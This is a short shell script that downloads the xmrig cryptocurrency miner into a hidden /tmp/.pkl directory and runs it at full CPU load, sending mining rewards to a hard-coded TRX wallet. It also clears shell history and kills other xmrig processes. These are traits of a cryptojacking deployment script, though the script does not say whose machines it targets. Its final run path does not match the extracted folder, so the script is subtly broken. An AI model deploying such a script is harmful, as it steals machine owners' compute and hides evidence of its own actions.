yum install -y epel-release
history -c
tuned-adm profile throughput-performance

yum install -y hwloc hwloc-plugins hwloc-devel extra-cmake-modules libuv-devel libhwloc-devel libssl-devel wget cmake openssl-devel psmisc openssl-libs git make cmake3 gcc gcc-c++ libstdc++-static automake msr-tools libtool autoconf
killall xmrig

cd /tmp/.pkl

rm -fdr xmrig

wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz

tar xvf xmrig-6.17.0-linux-x64.tar.gz

cd xmrig-6.17.0-linux-x64

/tmp/.pkl/xmrig-6.17.0/xmrig -o rx.unmineable.com:3333 -u TRX:TRhWeDivAHJjACjLk1gwmxN333PSDC6yXZ -p $HOSTNAME --randomx-1gb-pages --cpu-max-threads-hint=100 -t=16
